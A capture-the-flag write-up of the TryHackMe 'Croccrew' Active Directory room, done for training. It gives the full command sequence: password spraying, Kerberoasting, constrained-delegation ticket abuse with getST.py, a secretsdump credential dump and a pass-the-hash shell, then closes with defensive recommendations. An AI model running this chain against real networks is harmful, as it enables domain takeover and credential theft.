---
title: Croccrew
date: 2026-10-19
platform: TryHackMe
difficulty: Insane
tags:
summary: ""
---
# Room: https://tryhackme.com/room/crocccrew

![](../Attachments/Pasted%20image%2020261019234545.png)[]

# Nmap

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-19 15:43:22Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49894/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# http

![](../Attachments/Pasted%20image%2020261019235204.png)

Found `robots.txt` in directory enumeration.

```bash
$ gobuster dir -u http://cooctus.corp -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,js 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
robots.txt           (Status: 200) [Size: 70]
```

## Robots.txt

```
User-Agent: *
Disallow:
/robots.txt
/db-config.bak
/backdoor.php
```

## db-config.bak

This exposes a credential for a server called `db.cooctus.corp`.

```php
<?php

$servername = "db.cooctus.corp";
$username = "C00ctusAdm1n";
$password = "B4dt0th3b0n3";

// Create connection $conn = new mysqli($servername, $username, $password);

// Check connection if ($conn->connect_error) {
die ("Connection Failed: " .$conn->connect_error);
}
echo "Connected Successfully";
?>
```

`db.cooctus.corp` is the same defaced page that lead to nothing. There was a terminal in `/backdoor.php` but it doesn't have any functionality. No login page. Moving on. 

With no valid usernames nor credentials, I decided to use the names on the defacement page.

```
SP00KY
CAKE
MILES
CRYILLIC
VARG
HORSHARK
DARKSTAR7471
ORIEL
NAMELESS0NE
SMACKHACK
FAWAZ
```

I ran them through `kerbrute userenum` and found 3 valid usernames.

```bash
$ kerbrute userenum -d cooctus.corp cleaned_names.txt --dc cooctus.corp

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/19/26 - Ronnie Flathers @ropnop

2026/10/19 09:20:35 >  Using KDC(s):
2026/10/19 09:20:35 >   cooctus.corp:88

2026/10/19 09:20:35 >  [+] VALID USERNAME:       CRYILLIC@cooctus.corp
2026/10/19 09:20:35 >  [+] VALID USERNAME:       VARG@cooctus.corp
2026/10/19 09:20:35 >  [+] VALID USERNAME:       FAWAZ@cooctus.corp
2026/10/19 09:20:35 >  Done! Tested 3 usernames (3 valid) in 0.198 seconds
```

Password-spray attack found me a valid password for user `CRYILLIC`. 

```bash
$ nxc smb cooctus.corp -u cleaned_names.txt -p /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt --continue-on-success | grep '[+]'
SMB                      10.146.184.126  445    DC               [+] COOCTUS.CORP\CRYILLIC:qwerty 
```

It looks like the lockout policy isn't set properly because the wordlists contains 20 words. Even with just 3 usernames, It should trigger a lockout for bruteforce. 

With the discovery of these credentials, It paved the way for me to be able to perform `Kerberoasting`. 

```bash
$ GetUserSPNs.py cooctus.corp/CRYILLIC:qwerty -request -outputfile kerberos.txt -dc-ip cooctus.corp
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name            MemberOf  PasswordLastSet             LastLogon                   Delegation  
--------------------  --------------  --------  --------------------------  --------------------------  -----------
HTTP/dc.cooctus.corp  password-reset            2021-06-08 15:00:39.356663  2021-06-08 14:46:23.369540  constrained 
```

Due to a weak password, I was able to crack `password-reset's` password.

```bash
$ john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt kerberos.txt                
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
resetpassword    (?)     
1g 0:00:00:00 DONE (2026-10-19 09:36) 4.761g/s 1126Kp/s 1126Kc/s 1126KC/s rijeka..pingus
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

I noticed that this account have a `constrained delegation`. It can impersonate a user to access specific service. 

To know more about it, I ran `bloodhound-python` to see the attack path.

![](../Attachments/Pasted%20image%2020261020004803.png)

This shows that my current user is allowed to impersonate anyone on the Domain Controller via Constrained Delegation, specifically targeting the custom service class oakley/DC.COOCTUS.CORP.

So in most cases, a delegation towards domain controller will allow me to impersonate the Administrator and use that service ticket to run tools that accepts kerberos authentication such as `secretsdump.py`. 

The problem with that is `secretsdump.py` requires an `SPN / service class` that permits `RPC/DRSR communication` (such as HOST/..., CIFS/... with sufficient rights, or standard DC replication rights). 

The delegation rule will give me raw ticket for `oakley` service class. To bypass this, I will use Impacket's `GetST.py` with the `-altservice cifs` flag. While the KDC still issues the valid Administrator-level ticket for `oakley`, `-altservice` rewrites the service class locally in the `ticket cache` to `cifs`. This allows me to authenticate successfully to the target's file shares with full administrative privileges.

```bash
$ getST.py cooctus.corp/password-reset:resetpassword -dc-ip 10.146.184.126 -impersonate Administrator -spn oakley/DC.COOCTUS.CORP -altservice cifs/DC.COOCTUS.CORP
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Changing service from oakley/DC.COOCTUS.CORP@COOCTUS.CORP to cifs/DC.COOCTUS.CORP@COOCTUS.CORP
[*] Saving ticket in Administrator@cifs_DC.COOCTUS.CORP@COOCTUS.CORP.ccache
```

Just export the ticket as `KRB5CCNAME` and use it to run `secretsdump.py.`

```bash
$ export KRB5CCNAME=/home/kali/Machines/Croccrew/enum_output/Administrator@cifs_dc.cooctus.corp@COOCTUS.CORP.ccache 
```

```bash
$ secretsdump.py -dc-ip 10.146.184.126 -k -no-pass cooctus.corp/Administrator@dc.cooctus.corp
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:{LMHASH REDACTED}:{NTHASH REDACTED}:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:{NTHASH REDACTED}:::
krbtgt:502:{LMHASH REDACTED}:d4609747ddec61b924977ab42538797e:::
COOCTUS.CORP\Visitor:1109:{LMHASH REDACTED}:{NTHASH REDACTED}:::
COOCTUS.CORP\mark:1115:{LMHASH REDACTED}:{NTHASH REDACTED}:::
```

Now that I have domain hash of `Administrator`. I used `evil-rm` to get all the flags at once.

```bash
$ evil-winrm -i cooctus.corp -u Administrator -H add41095f1fb0405b32f70a489de022d
                                        
Evil-WinRM shell v4.1
                                        
Info: Establishing connection to remote endpoint
                                        
Info: Connection successful
*Evil-WinRM* PS C:\Users\Administrator\Documents> net user Administrator
User name                    Administrator
Full Name
Comment                      Built-in account for administering the computer/domain
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/8/2021 3:00:25 PM
Password expires             Never
Password changeable          6/9/2021 3:00:25 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/19/2026 10:48:13 AM

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *Group Policy Creator *Schema Admins
                             *Domain Users         *Domain Admins
                             *Enterprise Admins    *RDP-Users
The command completed successfully.
```

This entire attack chain was made possible by a weak password policy and insecure Kerberos Constrained Delegation (KCD) configuration on the password-reset account, which was granted permission to delegate to the Domain Controller using a custom service class (oakley/DC.COOCTUS.CORP).

To properly secure the environment and prevent this type of ticket manipulation:

- `Remove Dangerous Delegation:` Audit and clear unnecessary msDS-AllowedToDelegateTo attributes on service accounts, ensuring non-privileged accounts cannot delegate to Tier-0 assets.
- `Protect Sensitive Accounts:` Enable "Account is sensitive and cannot be delegated" on all Domain Administrator and high-privilege accounts to cryptographically block S4U impersonation.
- `Migrate to RBCD:` Prefer Resource-Based Constrained Delegation where permissions are managed locally on the target resource rather than relying on legacy Classic KCD.
# Flags

```bash
*Evil-WinRM* PS C:\Shares\Home> dir


    Directory: C:\Shares\Home


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/8/2021  12:38 PM             28 priv-esc-2.txt
-a----         6/7/2021   8:08 PM             22 priv-esc.txt
-a----         6/7/2021   8:14 PM             17 user.txt


t*Evil-WinRM* PS C:\Shares\Home> type *
THM{REDACTED} # priv-esc-2.txt
THM{REDACTED} # priv-esc.txt
THM{REDACTED} # user.txt

*Evil-WinRM* PS C:\Shares\Home> dir C:\Users


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         6/7/2021  10:23 PM                {REDACTED} # User planted by the threat actors


*Evil-WinRM* PS C:\Perflogs\Admin> type root.txt
THM{REDACTED} # Root flag

```

















